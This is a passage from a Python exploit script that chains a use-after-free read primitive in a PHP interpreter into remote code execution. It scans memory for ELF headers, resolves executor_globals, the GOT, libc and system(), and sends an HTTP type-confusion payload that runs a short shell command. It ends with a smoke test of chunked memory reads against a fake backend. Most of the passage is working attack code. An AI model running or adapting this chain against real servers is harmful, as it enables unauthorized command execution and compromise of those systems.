    is libc system() and whose first 16 bytes (the gc header) are the shell
    command. cmd14 is at most 14 bytes.
    """
    payload = _dispatch_fire.build_fire_payload(
        ce_stdclass, system_addr, spray_addr, cmd14, 200,
        spray_len=SPRAY_LEN, spray_count=SPRAY_COUNT, c_part=C_PART,
        ref_base=REF_BASE, exit0_wrap=False)

    output = send_http(payload)
    time.sleep(0.3)
    return output


def trigger_rce(ce_stdclass, system_addr, spray_addr, cmd):
    """Single-shot: run one command (max 14 bytes after the GC byte)."""
    print(f"\n[Phase R-7] Type confusion to libc system()")
    print(f"  stdClass ce = 0x{ce_stdclass:x}")
    print(f"  system()    = 0x{system_addr:x}")
    print(f"  S           = 0x{spray_addr:x}")
    print(f"  Command (after GC_ADDREF): \\n{cmd[1:].decode('latin-1', errors='replace')}")
    print(f"  Sending RCE payload...")
    output = _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd[1:])
    if output is not None:
        print(f"  Response ({len(output)} bytes): {output[:200]!r}")
    else:
        print(f"  No response (worker may have crashed after execution)")
    return output is not None


# Chain driver.
def run_chain(seed_chunk_ptr, cmd=b"id>/dev/shm/x", host=None, port=None,
              path=None):
    """Drive the resolve phases (ELF scan -> fire) for a single <=14-byte
    command, using an INJECTED heap pointer (``seed_chunk_ptr``) in place of a
    heap_leak() R: trick.

    A read backend must already be installed via set_read_backend(). ``host`` /
    ``port`` / ``path`` are optional and only affect the UAF-specific fire path
    (R-7) which still speaks send_http; the resolver itself uses the injected
    backend exclusively.

    Returns True if the fire request was delivered.
    """
    global HOST, PORT, PATH
    if host is not None:
        HOST = host
    if port is not None:
        PORT = port
    if path is not None:
        PATH = path
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")

    heap_ref = seed_chunk_ptr
    if not heap_ref:
        return False
    chunk = heap_ref & ~0x1FFFFF
    elf_candidates = scan_for_elf(chunk)
    if not elf_candidates:
        return False
    elf_base = eg = pltgot = None
    for base, phnum in elf_candidates:
        try:
            eg, pltgot = gnu_hash_resolve(base, "executor_globals",
                                          "_GLOBAL_OFFSET_TABLE_")
        except RuntimeError:
            continue
        elf_base = base
        break
    if elf_base is None:
        return False
    libc_base = libc_from_got_dump(elf_base, pltgot)
    if libc_base is None:
        return False
    system_addr = gnu_hash_resolve(libc_base, "system")
    ce_stdclass = lookup_class_table(eg, "stdclass")
    if ce_stdclass is None:
        return False
    spray_addr = find_spray_slot(heap_ref)
    if spray_addr is None:
        return False
    return trigger_rce(ce_stdclass, system_addr, spray_addr, b"\x09" + cmd)


# Smoke test: check the 16 KB chunking in read_mem concatenates correctly
# across a >16 KB span, using an in-memory fake backend (no live target).
if __name__ == "__main__":
    # Build a fake victim memory: a flat buffer at VBASE.
    VBASE = 0x7f0000000000
    VSIZE = 0x20000                      # 128 KB
    VICTIM = bytearray(VSIZE)
    for i in range(VSIZE):
        VICTIM[i] = (i * 7 + 13) & 0xFF  # deterministic, non-repeating-ish

    calls = {"n": 0}

    def fake_backend(fake_str_addr, timeout=5):
        """Honors the BACKEND CONTRACT over VICTIM:
          slen = natural length (remaining bytes from the data region),
          data = VICTIM[fake_str_addr+0x18 : ...] truncated to 16 KB,
          req_count incremented once per call (backend's responsibility).
        """
        global req_count
        req_count += 1
        calls["n"] += 1
        data_addr = fake_str_addr + 0x18
        idx = data_addr - VBASE
        if idx < 0 or idx >= VSIZE:
            return None
        avail = VICTIM[idx:]
        slen = len(avail)                # natural len MAY exceed 16 KB
        data = bytes(avail[:CHUNK])      # DATA truncated to <= 16 KB
        return (slen, data)

    set_read_backend(fake_backend)

    print("=== resolver_port smoke test: read_mem 16 KB chunking ===")
    print(f"CHUNK (per-call DATA cap) = {CHUNK} bytes")

    # Read a span that straddles multiple 16 KB chunks.
    T = VBASE + 0x100
    SPAN = 40000                          # > 2*CHUNK -> forces 3 backend calls
    expected = bytes(VICTIM[(T - VBASE):(T - VBASE) + SPAN])

    calls["n"] = 0
    before = req_count
    got = read_mem(T, SPAN)
    n_calls = calls["n"]

    import math
    expected_calls = math.ceil(SPAN / CHUNK)

    print(f"requested span      = {SPAN} bytes starting at 0x{T:x}")
    print(f"backend calls made  = {n_calls} (expected {expected_calls}) "
          f"[req_count {before} -> {req_count}]")
    print(f"single-call cap     = {CHUNK} bytes  =>  a single call could NOT "
          f"have returned {SPAN} bytes")
    assert got is not None, "read_mem returned None"
    print(f"assembled length    = {len(got)} bytes")
    assert len(got) == SPAN, f"length mismatch: {len(got)} != {SPAN}"
    assert n_calls == expected_calls, f"call count {n_calls} != {expected_calls}"
    assert got == expected, "assembled bytes do not match victim memory"
    # Prove each chunk boundary concatenated in the right order:
    assert got[:CHUNK] == expected[:CHUNK]
    assert got[CHUNK:2 * CHUNK] == expected[CHUNK:2 * CHUNK]
    assert got[2 * CHUNK:] == expected[2 * CHUNK:]
    print("chunk-boundary check: PASS (bytes match across all 3 segments)")

    # A read that runs off the end of the mapping -> None (graceful).
    tail = read_mem(VBASE + VSIZE - 8, 40000)
    print(f"off-the-end read    = {tail!r} (expected None or short)")

    # A small (<=16 KB) read still works through the same helper.
    small = read_mem(VBASE + 0x50, 100)
    assert small == bytes(VICTIM[0x50:0x50 + 100])
    print("small read (<=16KB) : PASS")

    print("=== ALL SMOKE-TEST ASSERTIONS PASSED ===")
